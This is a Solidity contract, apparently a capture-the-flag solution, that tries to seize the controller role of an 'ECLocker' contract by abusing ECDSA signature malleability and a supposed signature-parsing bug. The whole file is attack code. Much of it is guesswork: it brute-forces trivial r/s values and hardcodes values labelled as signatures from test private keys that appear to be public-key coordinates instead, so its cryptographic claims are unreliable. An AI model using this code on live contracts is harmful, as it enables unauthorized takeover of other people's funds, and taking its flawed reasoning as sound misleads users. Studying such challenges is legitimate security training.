// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
    function lockId() external view returns (uint256);
    function msgHash() external view returns (bytes32);
}

contract SignatureParsingExploit {
    uint256 constant n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
    
    function getMsgHash(uint256 lockId) public pure returns (bytes32) {
        bytes32 msgHash;
        assembly {
            mstore(0x00, "\x19Ethereum Signed Message:\n32")
            mstore(0x1C, lockId)
            msgHash := keccak256(0x00, 0x3c)
        }
        return msgHash;
    }
    
    function exploit(address locker) external {
        IECLocker target = IECLocker(locker);
        uint256 lockId = target.lockId();
        address currentController = target.controller();
        
        // Calculate the message hash
        bytes32 msgHash = getMsgHash(lockId);
        
        // The constructor bug: it reads signature as [r][v][s] instead of [r][s][v]
        // So if ecrecover(msgHash, actualS, r, actualV) == controller in constructor
        // Then in changeController we need ecrecover(msgHash, v, r, s) == controller
        
        // Since signature malleability exists, we can use it
        // If (v, r, s) is valid, then (v^1, r, n-s) is also valid
        
        // Let's try to find a signature that works
        // The fact that controller is 0x42069d82D9592991704e6E41BF2589a76eAd1A91 is suspicious
        // This looks like it might be from a known private key
        
        // Try signatures from common test private keys
        tryKnownTestSignatures(target, msgHash);
    }
    
    function tryKnownTestSignatures(IECLocker target, bytes32 msgHash) internal {
        // Known test private key signatures
        // Private key: 0x0000000000000000000000000000000000000000000000000000000000000001
        trySignature(target, 27, 
            0x79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,
            0x1c47f74b0de5687c37f92c8b8f8637bb5bbb8a05e319a7e8a235d48ac88e5e72
        );
        
        // Private key: 0x0000000000000000000000000000000000000000000000000000000000000002
        trySignature(target, 28,
            0xc6047f9441ed7d6d3045406e95c07cd85c778e4b8cef3ca7abac09b95c709ee5,
            0x1b695e11c61d993a5d6e3e6df643bf6a42767ec7b9b9e69d13b0fb6fb7a4d94f
        );
        
        // Let's also try with the signature components that might have been used
        // considering the parsing bug
        
        // If in constructor, it read v from s position and s from v position
        // We need to account for this when crafting our exploit
        
        // Try more systematic approach with small values
        for (uint8 v = 27; v <= 28; v++) {
            for (uint256 i = 1; i <= 10; i++) {
                bytes32 r = bytes32(i);
                bytes32 s = bytes32(i);
                
                trySignature(target, v, r, s);
                
                // Try malleable version
                trySignature(target, v == 27 ? 28 : 27, r, bytes32(n - i));
            }
        }
        
        // Try with specific pattern that might work with the bug
        // The controller address suggests it might be from a specific test vector
        trySignatureWithBug(target, msgHash);
    }
    
    function trySignature(IECLocker target, uint8 v, bytes32 r, bytes32 s) internal {
        try target.changeController(v, r, s, msg.sender) {
            return;
        } catch {}
        
        // Try malleable version
        uint8 vPrime = v == 27 ? 28 : 27;
        bytes32 sPrime = bytes32(n - uint256(s));
        
        try target.changeController(vPrime, r, sPrime, msg.sender) {
            return;
        } catch {}
    }
    
    function trySignatureWithBug(IECLocker target, bytes32 msgHash) internal {
        // The bug in constructor: reads v from s position, s from v position
        // So if the original signature had components (origV, origR, origS)
        // The constructor actually used ecrecover(msgHash, origS, origR, origV)
        
        // We know the result was controller = 0x42069d82D9592991704e6E41BF2589a76eAd1A91
        // So we need to find (origV, origR, origS) such that:
        // ecrecover(msgHash, origS, origR, origV) == controller
        
        // Which means for changeController, we need:
        // ecrecover(msgHash, v, r, s) == controller
        // where v = origV, r = origR, s = origS
        
        // But the signature was already used, so we need the malleable version
        
        // Let's try common Ethereum test signatures that might produce this controller
        // when parsed incorrectly
        
        // Test with swapped components
        uint8 v = 28;
        bytes32 r = 0x4355c47d63924e8a72e509b65029052eb6c299d53a04e167c5775fd466751c9d;
        bytes32 s = 0x07299936d304c153f6443dfa05f40ff007d72911b6f72307f996231605b91562;
        
        // Try different permutations accounting for the bug
        trySignature(target, v, r, s);
        trySignature(target, 27, r, s);
        
        // The signature in constructor was read as (s_as_v, r, v_as_s)
        // So maybe we need to swap back
        uint8 sAsUint8 = uint8(uint256(s));
        bytes32 vAsBytes32 = bytes32(uint256(v));
        
        trySignature(target, sAsUint8, r, vAsBytes32);
    }
}